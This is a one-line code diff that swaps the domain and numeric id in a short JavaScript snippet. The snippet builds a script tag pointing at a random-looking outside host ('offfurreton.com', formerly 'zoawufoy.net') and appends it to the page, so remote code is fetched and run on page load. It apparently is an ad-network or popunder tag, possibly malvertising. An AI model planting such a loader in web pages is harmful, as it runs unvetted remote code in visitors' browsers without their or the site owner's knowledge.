@@ -1,1 +1,1 @@
-(function(d,z,s){s.src='https://'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('zoawufoy.net',5526802,document.createElement('script'))
+(function(d,z,s){s.src='https://'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('offfurreton.com',5650483,document.createElement('script'))
